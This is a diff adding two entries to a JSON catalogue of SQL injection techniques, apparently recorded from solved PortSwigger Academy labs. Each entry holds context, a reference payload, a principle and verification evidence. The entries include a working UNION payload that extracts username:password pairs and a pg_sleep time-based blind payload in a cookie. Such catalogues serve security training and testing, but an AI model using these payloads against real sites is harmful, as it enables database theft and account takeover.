@@ -53,5 +53,30 @@
       "url": "http://localhost:8084/xvwa/vulnerabilities/sqli_blind/ (POST search=1' AND (SELECT(SLEEP(5)))-- -)",
       "verify": "delay"
     }
+  },
+  {
+    "id": "auto-20261031133124",
+    "context": "PortSwigger mystery lab e-commerce. GET /filter?category= reflected in <h1> and product table. PostgreSQL 12.22. Single-quote triggers 500. Two-column UNION; both columns string-typed and reflected (col1 <th>, col2 <td>). Extracted information_schema tables->columns->users dump to get administrator password, then logged in.",
+    "reference_payload": "category=x' UNION SELECT username||':'||password,email FROM users--",
+    "principle": "UNION-based SQLi: string-type category param closed with ', 2-column UNION aligned (both string cols reflected), PostgreSQL || concatenation to pack username:password, then info_schema enumeration -> users dump -> admin login.",
+    "source": "portswigger",
+    "verify_url": "https://0a6c00b404f99112831f006000f60038.web-security-academy.net/filter?category=x%27%20UNION%20SELECT%20username%7C%7C%27:%27%7C%7Cpassword,email%20FROM%20users--%20",
+    "evidence": {
+      "verify": "echo",
+      "url": "https://0a6c00b404f99112831f006000f60038.web-security-academy.net/filter?category=x%27%20UNION%20SELECT%20username%7C%7C%27:%27%7C%7Cpassword,email%20FROM%20users--%20",
+      "match": "administrator:"
+    }
+  },
+  {
+    "id": "auto-20261031155238",
+    "context": "PortSwigger mystery lab e-commerce. TrackingId cookie is queried in backend SQL (no reflected output -> blind). PostgreSQL backend. Cookie value concatenated into query. Confirmed time-based blind: pg_sleep(10) yields ~31s vs baseline 0.9s.",
+    "reference_payload": "TrackingId=nIcl57iJzjx8mhU5'||pg_sleep(10)-- ",
+    "principle": "Time-based blind SQLi via TrackingId cookie: string type closed with ', append ||pg_sleep(N)-- to introduce PostgreSQL time delay as the oracle. No output reflection, delay is the only signal.",
+    "source": "portswigger",
+    "evidence": {
+      "verify": "delay",
+      "url": "https://0a2800b00449c97e8011a3d8008f0008.web-security-academy.net/",
+      "match": "10"
+    }
   }
 ]
